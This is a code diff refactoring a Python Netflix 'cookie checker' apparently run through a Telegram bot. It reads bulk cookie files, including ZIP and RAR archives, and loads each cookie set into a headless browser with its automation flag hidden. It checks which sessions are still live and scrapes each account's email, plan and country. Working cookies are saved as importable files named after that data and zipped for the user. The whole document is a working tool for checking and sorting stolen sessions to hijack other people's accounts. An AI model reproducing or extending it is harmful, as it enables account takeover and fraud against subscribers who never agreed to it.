@@ -33,8 +33,14 @@ def log(text):
     """Simple logging function for console output"""
     print(text)
 
+# ================================================================
+# Helper Functions
+# ================================================================
 def get_emails_from_folder(folder_path):
-    """Scans the valid cookies folder and extracts emails from filenames."""
+    """
+    Scans the valid cookies folder and extracts emails from filenames.
+    Useful to avoid saving duplicate cookies for the same account.
+    """
     if not os.path.exists(folder_path):
         os.makedirs(folder_path)
         return set()
@@ -47,16 +53,16 @@ def get_emails_from_folder(folder_path):
         if match:
             email = match.group(2)
             existing_emails.add(email)
+            log(f"📧 Detected already saved email: {email}")
             
     return existing_emails
 
 def extract_netflix_plan(html_content: str) -> str:
     """
-    Enhanced plan extraction with multiple fallback methods
+    Try to extract Netflix plan from HTML.
+    Multiple strategies: keyword search, BeautifulSoup parsing, regex patterns.
     """
     plan = "Unknown"
-    
-    # Method 1: Look for "Premium plan" text in HTML
     if 'Premium plan' in html_content or 'premium plan' in html_content.lower():
         return 'Premium'
     elif 'Standard plan' in html_content or 'standard plan' in html_content.lower():
@@ -66,11 +72,8 @@ def extract_netflix_plan(html_content: str) -> str:
     elif 'Mobile plan' in html_content or 'mobile plan' in html_content.lower():
         return 'Mobile'
     
-    # Method 2: Try BeautifulSoup parsing
     try:
         soup = BeautifulSoup(html_content, "html.parser")
-        
-        # Look for h3 with plan info
         h3_tags = soup.find_all('h3')
         for tag in h3_tags:
             text = tag.get_text().lower()
@@ -82,8 +85,6 @@ def extract_netflix_plan(html_content: str) -> str:
                 return 'Basic'
             elif 'mobile' in text:
                 return 'Mobile'
-                
-        # Look for divs with plan class
         plan_divs = soup.find_all('div', class_=re.compile('plan', re.I))
         for div in plan_divs:
             text = div.get_text().lower()
@@ -95,10 +96,9 @@ def extract_netflix_plan(html_content: str) -> str:
                 return 'Basic'
             elif 'mobile' in text:
                 return 'Mobile'
-    except:
-        pass
+    except Exception as e:
+        log(f"⚠️ BeautifulSoup plan extraction error: {e}")
     
-    # Method 3: Regex patterns
     try:
         patterns = [
             r'data-uia="plan-label"><b>([^<]+)</b>',
@@ -106,51 +106,156 @@ def extract_netflix_plan(html_content: str) -> str:
             r'class="[^"]*plan[^"]*"[^>]*>([^<]+)',
             r'<h3[^>]*>([^<]*plan[^<]*)</h3>'
         ]
-        
         for pattern in patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
-                potential_plan = match.group(1).strip()
-                if 'premium' in potential_plan.lower():
-                    return 'Premium'
-                elif 'standard' in potential_plan.lower():
-                    return 'Standard'
-                elif 'basic' in potential_plan.lower():
-                    return 'Basic'
-                elif 'mobile' in potential_plan.lower():
-                    return 'Mobile'
-    except:
-        pass
+                return match.group(1).strip()
+    except Exception as e:
+        log(f"⚠️ Regex plan extraction error: {e}")
     
     return plan if plan != "Unknown" else "NULL"
 
 def extract_email_from_html(html_content: str) -> str:
     """
-    Extract email from HTML content with multiple methods
+    Extract email address from HTML content.
+    Falls back to regex and JSON pattern search.
     """
-    # Method 1: Direct regex search
     email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
     emails = re.findall(email_pattern, html_content)
-    
-    # Filter out common false positives
     for email in emails:
         if not any(x in email.lower() for x in ['example', 'test', 'netflix', 'support', 'help']):
             return email
-    
-    # Method 2: Look in JSON data
     try:
         json_pattern = r'"email"\s*:\s*"([^"]+@[^"]+)"'
         match = re.search(json_pattern, html_content)
         if match:
             return match.group(1)
-    except:
-        pass
-    
+    except Exception as e:
+        log(f"⚠️ JSON email extraction error: {e}")
     return 'N/A'
 
+# ================================================================
+# Cookie Parsing
+# ================================================================
+def _parse_cookie_header_format(cookie_str: str):
+    """Parse simple Key=Value cookie strings."""
+    if ' = ' in cookie_str and ';' not in cookie_str:
+        cookie_str = cookie_str.replace(' = ', '=', 1)
+    cookie = SimpleCookie()
+    cookie.load(cookie_str)
+    return {key: morsel.value for key, morsel in cookie.items()}
+
+def parse_cookie_line(cookie_str: str):
+    """Parse a single cookie line (JSON dict or Key=Value)."""
+    cookie_str = cookie_str.strip()
+    if cookie_str.startswith('{'):
+        try:
+            data = json.loads(cookie_str)
+            if isinstance(data, dict) and 'name' in data and 'value' in data:
+                return {str(data['name']): str(data['value'])}
+        except Exception as e:
+            log(f"⚠️ JSON cookie line parse error: {e}")
+    return _parse_cookie_header_format(cookie_str)
+
+def parse_netscape_format(file_content: str):
+    """Parse Netscape cookie format."""
+    cookies = {}
+    for line in file_content.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'): 
+            continue
+        try:
+            parts = line.split('\t')
+            if len(parts) == 7: 
+                cookies[parts[5]] = parts[6]
+        except Exception as e:
+            log(f"⚠️ Netscape parse error: {e}")
+            continue
+    return cookies if cookies else None
+
+def parse_input_to_cookie_list(file_content: str):
+    """
+    Detect format of cookie file and parse into list of dictionaries.
+    Supports NetflixId, JSON, Netscape, and simple Key=Value.
+    """
+    content = file_content.strip()
+    if not content: 
+        return []
+    lines = content.splitlines()
+    first_line = lines[0].strip()
+    if first_line.startswith('NetflixId'):
+        log("📄 Detected 'NetflixId' format")
+        return [d for d in (parse_cookie_line(line) for line in lines) if d]
+    elif first_line.startswith('['):
+        log("📄 Detected JSON array format")
+        try:
+            data = json.loads(content)
+            cookie_dict = {str(i['name']): str(i['value']) for i in data if 'name' in i and 'value' in i}
+            return [cookie_dict] if cookie_dict else []
+        except Exception as e:
+            log(f"⚠️ JSON array parse error: {e}")
+            return []
+    elif first_line.startswith('.') or first_line.startswith('# Netscape'):
+        log("📄 Detected Netscape format")
+        cookie_dict = parse_netscape_format(content)
+        return [cookie_dict] if cookie_dict else []
+    else:
+        log("📄 Attempting simple Key=Value parsing")
+        return [d for d in (parse_cookie_line(line) for line in lines) if d]
+
+# ================================================================
+# Save Routines (Valid / Invalid)
+# ================================================================
+def _save_valid_cookie_with_info(cookie_dict, info):
+    """
+    Save a validated cookie into valid_cookies folder with
+    filename pattern: [Country][Email][Plan][Extra].txt
+    """
+    global temp_results_dir
+    filename = (
+        f"[{info.get('country', 'N/A')}]"
+        f"[{info.get('email', 'N/A')}]"
+        f"[{info.get('plan', 'NULL')}]"
+        f"[{info.get('extra_member', 'false')}].txt"
+    )
+    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
+    os.makedirs(valid_dir, exist_ok=True)
+    output_path = os.path.join(valid_dir, filename)
+    payload = []
+    for name, value in cookie_dict.items():
+        secure = name in SECURE_HTTPONLY_NAMES
+        http_only = name in SECURE_HTTPONLY_NAMES
+        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
+    with open(output_path, 'w', encoding='utf-8') as f:
+        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
+    log(f"💾 Saved VALID cookie: {output_path}")
+    return output_path
+
+def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source"):
+    """
+    Copy the original file unchanged into invalid_cookies folder.
+    """
+    global temp_results_dir
+    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
+    os.makedirs(invalid_dir, exist_ok=True)
+    filename = os.path.basename(source_filename)
+    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+    dst_path = os.path.join(invalid_dir, filename)
+    try:
+        shutil.copy2(source_filename, dst_path)
+        log(f"❌ Saved INVALID cookie (original preserved): {dst_path}")
+    except Exception as e:
+        log(f"⚠️ Failed to copy invalid cookie {source_filename}: {e}")
+    return dst_path
+# ================================================================
+# Netflix Cookie Checker Class
+# ================================================================
 class NetflixCookieChecker:
     """
-    Handles cookie validation and info extraction with Playwright using precise locators.
+    Handles cookie validation and info extraction with Playwright.
+    Each cookie set is injected, Netflix account page is visited,
+    and plan/email/country/extra_member details are extracted.
     """
     def get_country_name(self, country_code):
         country_map = {
@@ -164,264 +269,137 @@ class NetflixCookieChecker:
         with sync_playwright() as p:
             browser = None
             try:
-                browser = p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
+                browser = p.chromium.launch(
+                    headless=True,
+                    args=["--disable-blink-features=AutomationControlled"]
+                )
                 context = browser.new_context(
                     user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                 )
-                
                 playwright_cookies = [{"name": name, "value": str(value), "domain": ".netflix.com", "path": "/"} for name, value in cookie_dict.items()]
                 context.add_cookies(playwright_cookies)
-                
                 page = context.new_page()
+                log("🌐 Navigating to Netflix browse page...")
                 page.goto('https://www.netflix.com/browse', timeout=25000, wait_until='domcontentloaded')
-                
-                # If the URL is the login page, the cookie is invalid.
                 if "login" in page.url or "signup" in page.url:
                     return False, {"error": "Invalid Cookie (Redirected to Login)"}
-                
                 info = {'email': 'N/A', 'plan': 'N/A', 'country': 'N/A', 'extra_member': 'false'}
-
-                # --- 1. Get Plan from Account Page ---
+                log("🌐 Navigating to account page for plan info...")
                 page.goto('https://www.netflix.com/YourAccount', timeout=25000)
-                
-                # Method 1: Target the <h3> with the plan name.
                 try:
                     plan_element = page.locator('h3:has-text("plan")').first
                     plan_text = plan_element.inner_text(timeout=3000).strip()
                     info['plan'] = plan_text.replace('plan', '').strip()
                 except Exception:
-                    # Fallback Method: Target the bolded plan name inside a specific element.
                     try:
                         plan_element = page.locator('[data-uia="plan-label"] b').first
                         info['plan'] = plan_element.inner_text(timeout=3000).strip()
                     except Exception as e:
-                        log(f"Could not find plan information. Error: {e}")
-
-                # --- 2. Get Email from Security Page ---
+                        log(f"⚠️ Plan locator failed: {e}")
+                log("🌐 Navigating to security page for email info...")
                 page.goto('https://www.netflix.com/account/security', timeout=25000)
-                
                 try:
                     email_element = page.locator('[data-uia="account-email"]')
                     info['email'] = email_element.inner_text(timeout=3000).strip()
                 except Exception as e:
-                    log(f"Could not find email information. Error: {e}")
-
-                # --- 3. Get Other Details ---
+                    log(f"⚠️ Email locator failed: {e}")
                 html_content = page.content()
                 try:
                     country_match = re.search(r'"currentCountry":"([^"]+)"', html_content)
                     if country_match:
                         info['country'] = self.get_country_name(country_match.group(1))
-                except Exception:
-                    info['country'] = 'N/A'
-
+                except Exception as e:
+                    log(f"⚠️ Country regex failed: {e}")
                 if 'addextramember' in html_content.lower():
                     info['extra_member'] = 'True'
-                
-                # If plan or email is still missing, do one last generic check
                 if info['plan'] == 'N/A' and 'premium' in html_content.lower(): 
                     info['plan'] = 'Premium'
                 if info['email'] == 'N/A': 
                     info['email'] = extract_email_from_html(html_content)
-
                 return True, info
-                
-            except PlaywrightTimeoutError:
-                return False, {"error": "Connection Timeout with Playwright"}
+            except TimeoutError as e:
+                return False, {"error": f"Timeout error: {e}"}
             except Exception as e:
-                log(f"Playwright Error: {e}")
-                return False, {"error": f"An unexpected error occurred: {e}"}
+                log(f"❌ Playwright Error: {e}")
+                return False, {"error": f"Unexpected error: {e}"}
             finally:
                 if browser and browser.is_connected():
                     browser.close()
 
-# --- Initialize Checker ---
+# Initialize checker
 netflix_checker = NetflixCookieChecker()
-def _parse_cookie_header_format(cookie_str: str):
-    if ' = ' in cookie_str and ';' not in cookie_str:
-        cookie_str = cookie_str.replace(' = ', '=', 1)
-    cookie = SimpleCookie()
-    cookie.load(cookie_str)
-    return {key: morsel.value for key, morsel in cookie.items()}
 
-def parse_cookie_line(cookie_str: str):
-    cookie_str = cookie_str.strip()
-    if cookie_str.startswith('{'):
-        try:
-            data = json.loads(cookie_str)
-            if isinstance(data, dict) and 'name' in data and 'value' in data:
-                return {str(data['name']): str(data['value'])}
-        except: 
-            pass
-    return _parse_cookie_header_format(cookie_str)
-
-def parse_netscape_format(file_content: str):
-    cookies = {}
-    for line in file_content.splitlines():
-        line = line.strip()
-        if not line or line.startswith('#'): 
-            continue
-        try:
-            parts = line.split('\t')
-            if len(parts) == 7: 
-                cookies[parts[5]] = parts[6]
-        except: 
-            continue
-    return cookies if cookies else None
-
-def parse_input_to_cookie_list(file_content: str):
-    content = file_content.strip()
-    if not content: 
-        return []
-    lines = content.splitlines()
-    first_line = lines[0].strip()
-
-    if first_line.startswith('NetflixId'):
-        log("Detected 'NetflixId' start: Processing line-by-line.")
-        return [d for d in (parse_cookie_line(line) for line in lines) if d]
-    elif first_line.startswith('['):
-        log("Detected '[' start: Processing as a single JSON array.")
-        try:
-            data = json.loads(content)
-            cookie_dict = {str(i['name']): str(i['value']) for i in data if 'name' in i and 'value' in i}
-            return [cookie_dict] if cookie_dict else []
-        except:
-            log("Error: Failed to parse JSON array.")
-            return []
-    elif first_line.startswith('.') or first_line.startswith('# Netscape'):
-        log("Detected Netscape format.")
-        cookie_dict = parse_netscape_format(content)
-        return [cookie_dict] if cookie_dict else []
-    else:
-        log("No specific format detected, attempting simple Key=Value parsing.")
-        return [d for d in (parse_cookie_line(line) for line in lines) if d]
-
-def _save_valid_cookie_with_info(cookie_dict, info):
-    global temp_results_dir
-    filename = (
-        f"[{info.get('country', 'N/A')}]"
-        f"[{info.get('email', 'N/A')}]"
-        f"[{info.get('plan', 'NULL')}]"
-        f"[{info.get('extra_member', 'false')}].txt"
-    )
-    
-    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-    
-    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
-    os.makedirs(valid_dir, exist_ok=True)
-    output_path = os.path.join(valid_dir, filename)
-    
-    payload = []
-    for name, value in cookie_dict.items():
-        secure = name in SECURE_HTTPONLY_NAMES
-        http_only = name in SECURE_HTTPONLY_NAMES
-        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
-
-    with open(output_path, 'w', encoding='utf-8') as f:
-        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
-    
-    return output_path
-
-def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source"):
-    global temp_results_dir
-    filename = os.path.basename(source_filename)
-    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-    
-    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
-    os.makedirs(invalid_dir, exist_ok=True)
-    output_path = os.path.join(invalid_dir, filename)
-
-    payload = []
-    for name, value in cookie_dict.items():
-        secure = name in SECURE_HTTPONLY_NAMES
-        http_only = name in SECURE_HTTPONLY_NAMES
-        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
-    
-    invalid_data = {
-        "error": error_message,
-        "source_file": os.path.basename(source_filename),
-        "cookie_data": payload
-    }
-
-    with open(output_path, 'w', encoding='utf-8') as f:
-        json.dump(invalid_data, f, ensure_ascii=False, indent=4)
-    
-    return output_path
-
+# ================================================================
+# Thread Worker
+# ================================================================
 def process_single_cookie(cookie_dict, total_cookies, source_filename="unknown_source"):
+    """
+    Thread worker: validate a single cookie set, save valid/invalid,
+    and update counters and logs.
+    """
     global valid_count, invalid_count, checked_count
     if stop_flag:
         return
-
     is_valid, info = netflix_checker.validate_and_get_info(cookie_dict)
-    
     with check_lock:
         checked_count += 1
         if is_valid:
             email = info.get('email', 'N/A')
-            
             if email != 'N/A' and email in saved_emails:
-                path = _save_valid_cookie_with_info(cookie_dict, info)
-                log(f"🔄 UPDATED: Refreshed cookie for {email}")
+                _save_valid_cookie_with_info(cookie_dict, info)
+                log(f"🔄 UPDATED cookie for {email}")
             else:
                 valid_count += 1
                 if email != 'N/A':
                     saved_emails.add(email)
-                path = _save_valid_cookie_with_info(cookie_dict, info)
-                log(f"💾 NEW: {os.path.basename(path)}")
+                _save_valid_cookie_with_info(cookie_dict, info)
+                log(f"💾 NEW valid cookie saved for {email}")
         else:
             invalid_count += 1
             error_msg = info.get('error', 'Unknown error')
             _save_invalid_cookie(cookie_dict, error_msg, source_filename) 
-            log(f"❌ INVALID: {error_msg} (from {os.path.basename(source_filename)})")
+            log(f"❌ INVALID cookie: {error_msg} (file: {os.path.basename(source_filename)})")
+        log(f"📊 Progress: {checked_count}/{total_cookies} | ✅ Valid: {valid_count} | ❌ Invalid: {invalid_count}")
 
-        # Update progress
-        progress = checked_count / total_cookies
-        log(f'Progress: {checked_count}/{total_cookies} | Valid: {valid_count} | Invalid: {invalid_count}')
-
-# --- REVISED: run_check_on_file_list with live support ---
+# ================================================================
+# Orchestration
+# ================================================================
 def run_check_on_file_list(file_paths, live=False):
+    """
+    Process a list of .txt cookie files, multithreaded,
+    saving valid and invalid cookies, updating logs and counters.
+    """
     global temp_results_dir, stop_flag, valid_count, invalid_count, checked_count, saved_emails
-    
     stop_flag = False
     valid_count, invalid_count, checked_count = 0, 0, 0
     saved_emails = set()
-    
     temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
     os.makedirs(temp_results_dir, exist_ok=True)
-    
     cookies_with_sources = [] 
-
     for file_path in file_paths:
         if stop_flag:
-            log("🛑 Process stopped by user during file reading.")
+            log("🛑 Stopping check (user requested)")
             break
         try:
-            log(f"📖 Reading file: {os.path.basename(file_path)}")
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 content = f.read()
-            
             cookies_from_file = parse_input_to_cookie_list(content)
             if cookies_from_file:
-                log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
+                log(f"📖 Found {len(cookies_from_file)} cookie(s) in {os.path.basename(file_path)}")
                 for cookie_dict in cookies_from_file:
                     cookies_with_sources.append((cookie_dict, file_path))
             else:
-                log(f"  -> No valid cookie formats found in this file.")
-
+                log(f"⚠️ No valid cookie formats found in {file_path}")
         except Exception as e:
-            log(f"  -> ❌ Error reading or parsing file {os.path.basename(file_path)}: {e}")
+            log(f"❌ Error reading {file_path}: {e}")
             continue
-    
     total_to_check = len(cookies_with_sources)
     if total_to_check == 0:
-        log('No valid cookies found in the provided file(s).')
+        log("⚠️ No cookies to check")
         if live:
             yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
         return temp_results_dir
-
-    log(f'Found a total of {total_to_check} cookies to check across all files.')
-
+    log(f"🔎 Checking {total_to_check} cookies across {len(file_paths)} file(s)...")
     try:
         with ThreadPoolExecutor(max_workers=3) as executor: 
             futures = [executor.submit(process_single_cookie, c_dict, total_to_check, s_path) 
@@ -433,100 +411,110 @@ def run_check_on_file_list(file_paths, live=False):
                 future.result()
                 if live:
                     yield (checked_count, total_to_check, valid_count, invalid_count)
-
-        if stop_flag:
-            log('⏹️ Checking stopped by user.')
-        else:
-            log('🎉 Done checking all cookies.')
-            log(f'Final Results: Valid: {valid_count} | Invalid: {invalid_count}')
-
     except Exception as e:
-        log(f'Error during check: {e}')
-    
+        log(f"❌ Error during threaded check: {e}")
     if live:
         yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
     return temp_results_dir
-# --- REVISED: process_file_and_check with live support ---
+
+# ================================================================
+# Zipping Utility
+# ================================================================
+def _zip_folder(folder_path, output_zip):
+    """
+    Zip all files in folder_path into output_zip.
+    """
+    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, _, files in os.walk(folder_path):
+            for file in files:
+                abs_path = os.path.join(root, file)
+                rel_path = os.path.relpath(abs_path, folder_path)
+                zipf.write(abs_path, rel_path)
+    log(f"📦 Created zip: {output_zip}")
+    return output_zip
+
+# ================================================================
+# File Processor
+# ================================================================
 def process_file_and_check(input_file, live=False):
-    """Handles file input, extracts archives if necessary, and starts the check."""
-    log('⚙️ Starting process...')
-    
+    """
+    Handle .txt, .zip, .rar input files, run checker,
+    and zip valid/invalid cookies separately.
+    """
+    log("⚙️ Starting process...")
     if not input_file or not os.path.exists(input_file):
-        log('Error: Please select a valid file first.')
+        log("❌ Invalid input file")
         if live:
             yield (0, 0, 0, 0, None)
         return None
-
     file_ext = os.path.splitext(input_file)[-1].lower()
     txt_file_paths = []
     extract_dir = f"temp_extract_{uuid.uuid4().hex}"
-
     try:
         if file_ext == '.txt':
-            log(f"Selected single text file: {os.path.basename(input_file)}")
             txt_file_paths.append(input_file)
-
         elif file_ext == '.zip':
-            log(f"📦 ZIP archive detected. Extracting...")
             os.makedirs(extract_dir, exist_ok=True)
             with zipfile.ZipFile(input_file, 'r') as zip_ref:
                 zip_ref.extractall(extract_dir)
-            log("✅ ZIP extracted. Searching for .txt files...")
-            txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]
-
+            txt_file_paths = [os.path.join(root, fn) for root, _, files in os.walk(extract_dir) for fn in files if fn.endswith(".txt")]
         elif file_ext == '.rar':
-            log(f"📦 RAR archive detected. Extracting...")
             try:
                 rarfile.UNRAR_TOOL = "/usr/bin/unrar"
                 os.makedirs(extract_dir, exist_ok=True)
                 with rarfile.RarFile(input_file, 'r') as rar_ref:
                     rar_ref.extractall(extract_dir)
-                log("✅ RAR extracted. Searching for .txt files...")
-                txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]
+                txt_file_paths = [os.path.join(root, fn) for root, _, files in os.walk(extract_dir) for fn in files if fn.endswith(".txt")]
             except Exception as e:
                 log(f"❌ Failed to extract RAR: {e}")
                 if live:
                     yield (0, 0, 0, 0, None)
                 return None
-        
         else:
-            log("Unsupported File: Please select a .txt, .zip, or .rar file.")
+            log("❌ Unsupported file type")
             if live:
                 yield (0, 0, 0, 0, None)
             return None
-
         if not txt_file_paths:
-            log("❌ No .txt files found to process.")
+            log("⚠️ No .txt files found to process")
             if live:
                 yield (0, 0, 0, 0, None)
             return None
-        
-        log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
         results = run_check_on_file_list(txt_file_paths, live=live)
         if live:
             yield from results
-        else:
-            return results
-
+            return
+        valid_dir = os.path.join(results, "valid_cookies")
+        invalid_dir = os.path.join(results, "invalid_cookies")
+        valid_zip = os.path.join(results, "valid_cookies.zip")
+        invalid_zip = os.path.join(results, "invalid_cookies.zip")
+        if os.path.exists(valid_dir) and os.listdir(valid_dir):
+            _zip_folder(valid_dir, valid_zip)
+        if os.path.exists(invalid_dir) and os.listdir(invalid_dir):
+            _zip_folder(invalid_dir, invalid_zip)
+        return results, valid_zip, invalid_zip
     finally:
-        # Clean up extraction directory
         if os.path.exists(extract_dir):
             shutil.rmtree(extract_dir)
 
-# Main function to be called by telegram bot
+# ================================================================
+# Main and Test Harness
+# ================================================================
 def main(file_paths):
-    """Main function to be called by the telegram bot"""
+    """
+    Main function called by Telegram bot.
+    Returns (results_dir, valid_zip, invalid_zip).
+    """
     if not file_paths:
         return None
-    
-    # Process the first file (assuming single file upload)
-    results_dir = process_file_and_check(file_paths[0])
-    return results_dir
+    results = process_file_and_check(file_paths[0])
+    return results
 
 if __name__ == "__main__":
-    # Test with local file
     test_files = ["test_cookies.txt"]
     results = main(test_files)
     if results:
-        print(f"Results saved to: {results}")
-
+        results_dir, valid_zip, invalid_zip = results
+        print(f"📂 Results dir: {results_dir}")
+        print(f"✅ Valid zip: {valid_zip}")
+        print(f"❌ Invalid zip: {invalid_zip}")
